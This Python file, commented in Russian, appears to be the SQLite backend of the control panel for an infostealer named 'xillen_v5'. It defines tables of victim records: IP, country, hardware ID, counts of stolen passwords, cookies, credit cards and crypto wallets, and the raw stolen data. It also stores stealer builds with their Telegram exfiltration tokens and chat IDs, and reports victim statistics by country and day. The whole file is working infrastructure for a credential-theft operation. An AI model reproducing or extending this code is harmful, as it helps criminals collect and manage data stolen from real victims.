import sqlite3
import json
from datetime import datetime
import os

def init_database():
    """Инициализация SQLite базы данных"""
    db_path = os.path.join(os.path.dirname(__file__), 'xillen_v5.db')
    conn = sqlite3.connect(db_path)
    c = conn.cursor()
    
    # Таблица логов жертв
    c.execute('''CREATE TABLE IF NOT EXISTS logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        victim_id TEXT UNIQUE,
        ip TEXT,
        country TEXT,
        country_code TEXT,
        os TEXT,
        hwid TEXT,
        date TIMESTAMP,
        passwords INTEGER DEFAULT 0,
        cookies INTEGER DEFAULT 0,
        cc INTEGER DEFAULT 0,
        crypto INTEGER DEFAULT 0,
        files_size INTEGER DEFAULT 0,
        data BLOB
    )''')
    
    # Таблица билдов
    c.execute('''CREATE TABLE IF NOT EXISTS builds (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        name TEXT,
        telegram_token TEXT,
        chat_id TEXT,
        modules TEXT,
        created_at TIMESTAMP,
        file_path TEXT
    )''')
    
    # Таблица конфигов
    c.execute('''CREATE TABLE IF NOT EXISTS configs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        name TEXT,
        config_json TEXT,
        created_at TIMESTAMP
    )''')
    
    conn.commit()
    conn.close()
    return db_path

def get_logs():
    """Получить все логи жертв"""
    conn = sqlite3.connect(os.path.join(os.path.dirname(__file__), 'xillen_v5.db'))
    c = conn.cursor()
    c.execute('SELECT * FROM logs ORDER BY date DESC')
    logs = c.fetchall()
    conn.close()
    
    result = []
    for log in logs:
        result.append({
            'id': log[0],
            'victim_id': log[1],
            'ip': log[2],
            'country': log[3],
            'country_code': log[4],
            'os': log[5],
            'hwid': log[6],
            'date': log[7],
            'passwords': log[8],
            'cookies': log[9],
            'cc': log[10],
            'crypto': log[11],
            'files_size': log[12],
            'data': log[13]
        })
    return result

def get_stats():
    """Получить статистику"""
    conn = sqlite3.connect(os.path.join(os.path.dirname(__file__), 'xillen_v5.db'))
    c = conn.cursor()
    
    # Общее количество жертв
    c.execute('SELECT COUNT(*) FROM logs')
    total_victims = c.fetchone()[0]
    
    # Количество паролей
    c.execute('SELECT SUM(passwords) FROM logs')
    total_passwords = c.fetchone()[0] or 0
    
    # Количество куки
    c.execute('SELECT SUM(cookies) FROM logs')
    total_cookies = c.fetchone()[0] or 0
    
    # Количество крипто
    c.execute('SELECT SUM(crypto) FROM logs')
    total_crypto = c.fetchone()[0] or 0
    
    # Статистика по странам
    c.execute('SELECT country, COUNT(*) FROM logs GROUP BY country ORDER BY COUNT(*) DESC LIMIT 10')
    countries = c.fetchall()
    
    # Статистика по дням
    c.execute('SELECT DATE(date) as day, COUNT(*) FROM logs GROUP BY DATE(date) ORDER BY day DESC LIMIT 30')
    daily_stats = c.fetchall()
    
    conn.close()
    
    return {
        'total_victims': total_victims,
        'total_passwords': total_passwords,
        'total_cookies': total_cookies,
        'total_crypto': total_crypto,
        'countries': countries,
        'daily_stats': daily_stats
    }

def save_build(name, telegram_token, chat_id, modules, file_path):
    """Сохранить билд"""
    conn = sqlite3.connect(os.path.join(os.path.dirname(__file__), 'xillen_v5.db'))
    c = conn.cursor()
    c.execute('''INSERT INTO builds (name, telegram_token, chat_id, modules, created_at, file_path)
                 VALUES (?, ?, ?, ?, ?, ?)''',
              (name, telegram_token, chat_id, json.dumps(modules), datetime.now().isoformat(), file_path))
    conn.commit()
    conn.close()

def get_builds():
    """Получить все билды"""
    conn = sqlite3.connect(os.path.join(os.path.dirname(__file__), 'xillen_v5.db'))
    c = conn.cursor()
    c.execute('SELECT * FROM builds ORDER BY created_at DESC')
    builds = c.fetchall()
    conn.close()
    
    result = []
    for build in builds:
        result.append({
            'id': build[0],
            'name': build[1],
            'telegram_token': build[2],
            'chat_id': build[3],
            'modules': json.loads(build[4]) if build[4] else [],
            'created_at': build[5],
            'file_path': build[6]
        })
    return result

def save_config(name, config_json):
    """Сохранить конфиг"""
    conn = sqlite3.connect(os.path.join(os.path.dirname(__file__), 'xillen_v5.db'))
    c = conn.cursor()
    c.execute('''INSERT INTO configs (name, config_json, created_at)
                 VALUES (?, ?, ?)''',
              (name, json.dumps(config_json), datetime.now().isoformat()))
    conn.commit()
    conn.close()

def get_configs():
    """Получить все конфиги"""
    conn = sqlite3.connect(os.path.join(os.path.dirname(__file__), 'xillen_v5.db'))
    c = conn.cursor()
    c.execute('SELECT * FROM configs ORDER BY created_at DESC')
    configs = c.fetchall()
    conn.close()
    
    result = []
    for config in configs:
        result.append({
            'id': config[0],
            'name': config[1],
            'config_json': json.loads(config[2]) if config[2] else {},
            'created_at': config[3]
        })
    return result

def save_log(victim_data):
    """Сохранить лог жертвы"""
    conn = sqlite3.connect(os.path.join(os.path.dirname(__file__), 'xillen_v5.db'))
    c = conn.cursor()
    c.execute('''INSERT OR REPLACE INTO logs 
                 (victim_id, ip, country, country_code, os, hwid, date, passwords, cookies, cc, crypto, files_size, data)
                 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
              (victim_data.get('victim_id'), victim_data.get('ip'), victim_data.get('country'),
               victim_data.get('country_code'), victim_data.get('os'), victim_data.get('hwid'),
               datetime.now().isoformat(), victim_data.get('passwords', 0), victim_data.get('cookies', 0),
               victim_data.get('cc', 0), victim_data.get('crypto', 0), victim_data.get('files_size', 0),
               json.dumps(victim_data)))
    conn.commit()
    conn.close()

if __name__ == "__main__":
    import sys
    
    # Инициализация базы данных при запуске
    init_database()
    
    # Обработка команд из stdin
    try:
        for line in sys.stdin:
            try:
                command = json.loads(line.strip())
                cmd = command.get('cmd')
                params = command.get('params', {})
                
                if cmd == 'get_logs':
                    result = get_logs()
                    print(json.dumps(result))
                elif cmd == 'get_stats':
                    result = get_stats()
                    print(json.dumps(result))
                elif cmd == 'get_builds':
                    result = get_builds()
                    print(json.dumps(result))
                elif cmd == 'save_build':
                    save_build(params.get('name'), params.get('telegram_token'), 
                             params.get('chat_id'), params.get('modules'), params.get('file_path'))
                    print(json.dumps({'status': 'success'}))
                elif cmd == 'get_configs':
                    result = get_configs()
                    print(json.dumps(result))
                elif cmd == 'save_config':
                    save_config(params.get('name'), params.get('config_json'))
                    print(json.dumps({'status': 'success'}))
                elif cmd == 'save_log':
                    save_log(params)
                    print(json.dumps({'status': 'success'}))
                else:
                    print(json.dumps({'status': 'error', 'message': 'Unknown command'}))
            except json.JSONDecodeError:
                print(json.dumps({'status': 'error', 'message': 'Invalid JSON'}))
            except Exception as e:
                print(json.dumps({'status': 'error', 'message': str(e)}))
    except KeyboardInterrupt:
        pass
